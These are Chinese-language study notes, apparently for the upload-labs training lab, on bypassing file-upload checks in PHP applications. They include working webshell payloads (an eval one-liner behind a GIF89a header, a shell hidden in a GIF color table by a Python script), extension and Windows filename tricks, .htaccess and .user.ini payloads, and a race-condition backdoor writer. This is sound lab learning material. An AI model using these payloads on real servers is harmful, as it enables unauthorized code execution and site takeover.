# 二、能被当 PHP 解析的后缀

| 后缀 | 说明 |
|---|---|
| `.php` | 默认，黑名单必有 |
| `.php3` `.php4` `.php5` `.phtml` `.pht` | 老配置常见 |
| 大小写变体 `.Php` `.PHp` `.pHP` | 黑名单没 `strtolower` 时可绕 |
| `.jpg` `.png` `.gif` | 本身不解析，但可配合 `.htaccess`/`.user.ini`/解析漏洞/文件包含 |

# 四、Windows 文件系统特性（重点）

| 特性 | 效果 |
|---|---|
| 末尾空格 | Windows 自动去掉 → `shell.php ` 存成 `shell.php` |
| 末尾点 | Windows 自动去掉 → `shell.php.` 存成 `shell.php` |
| NTFS 数据流 `::$DATA` | Windows 剥离 → `shell.php::$DATA` 存成 `shell.php` |
| 大小写不敏感 | `.Php` 也能当 `.php` 执行 |

这些只在 Windows 有效，Linux 无效。

# 五、图片马

## 5.1 只验文件头（Pass-14）

```
GIF89a<?php @eval($_POST['x']); ?>
```

原理：文件头 `GIF89a` 骗过检查，后面代码不管。

## 5.2 验 getimagesize / exif（Pass-15/16）

必须是真图片 → 真图片末尾追加木马：

```cmd
copy 真图.png /b + shell.txt /a shell.png
```
- `/b` = 二进制（保持图片字节）
- `/a` = 文本（追加木马）

## 5.3 二次渲染（Pass-17，最难）

问题：`imagecreatefromgif` + `imagegif` 会重新解码编码，把末尾木马洗掉。

解法：木马藏进 GCT（全局色表） —— 二次渲染不改动色表区域。

```python
# ① 生成 256 色 GIF
from PIL import Image
img = Image.new("P", (50, 50))              # P = Palette 调色板模式
img.putpalette(list(range(768)))            # 768 = 256色 × 3字节(RGB)
img.save("g256.gif", "GIF")

# ② 木马写进 GCT
shell = b"<?php @eval($_POST['x']); ?>"
gif = bytearray(open("g256.gif", "rb").read())
for i in range(len(shell)):
    gif[13 + i] = shell[i]                  # GCT 从偏移 13 开始
open("shell.gif", "wb").write(gif)
```

GCT 大小：256 色 × 3 字节 = 768 字节，够放木马。

## 5.4 图片马要配合什么才能执行

```
① 文件包含（include.php?file=upload/xxx.gif）
② .htaccess / .user.ini
③ Apache 解析漏洞
④ 目录可执行
```

上传 ≠ 执行。

# 六、`.htaccess` vs `.user.ini`

|  | `.htaccess` | `.user.ini` |
|---|---|---|
| 属于 | Apache 配置 | PHP 配置 |
| 作用 | 改解析规则（后缀→PHP） | PHP 自动包含文件 |
| 内容 | `AddType application/x-httpd-php .jpg` | `auto_prepend_file=shell.jpg` |
| 前提 | Apache + `AllowOverride All` | PHP 5.3+ + CGI/FPM 模式 |
| 触发 | 访问 `.jpg` 就执行 | 需访问同目录的 PHP 文件 |

****
- `.htaccess` 必须精确叫 `.htaccess`（全等匹配，加前缀就废）
- Nginx 不认 `.htaccess`

# 七、条件竞争（Pass-18）

流程：
```
上传（用原始文件名 shell.php）→ 检查扩展名 → 非白名单 unlink 删除
                                    ↑
                            中间有时间差（毫秒级）
```

攻击：并发上传 + 并发访问，趁窗口执行。

工具：Burp 两个 Intruder（上传 + 访问）同时跑。

关键：木马要写持久后门（因为 shell.php 会被删）：
```php
<?php file_put_contents('webshell.php', '<?php phpinfo(); ?>'); ?>
```

# 八、常用函数（审计用）

| 分类 | 函数 |
|---|---|
| 文件名清洗 | `trim()` `deldot()` `strtolower()` `strrchr()` `str_ireplace()` `str_replace()` `in_array()` |
| 取扩展名 | `pathinfo()` `explode()` `end()` `reset()` |
| 文件操作 | `move_uploaded_file()` `fopen()` `fread()` `file_get_contents()` `file_put_contents()` `rename()` |
| 图片校验 | `unpack()` `getimagesize()` `exif_imagetype()` `imagecreatefromgif()` `imagegif()` |

关键函数行为：
```php
pathinfo("shell.php.", PATHINFO_EXTENSION)   // 返回 "" （末尾点后没内容）
strrchr("shell.php. ", '.')                  // 返回 ".php " （带空格）
end($arr)                                    // 取最后一个元素
reset($arr)                                  // 取第一个元素
```

# 九、一句话

> 上传的核心心法：检查的字段 ≠ 存盘的字段。黑名单 → 换后缀（.phtml/.php5）、大小写、Windows 特性（空格/点/`::$DATA`）、双写。白名单 → 图片马 + `.htaccess`/`.user.ini`/文件包含。二次渲染 → 木马藏 GCT。先传后删 → 条件竞争。
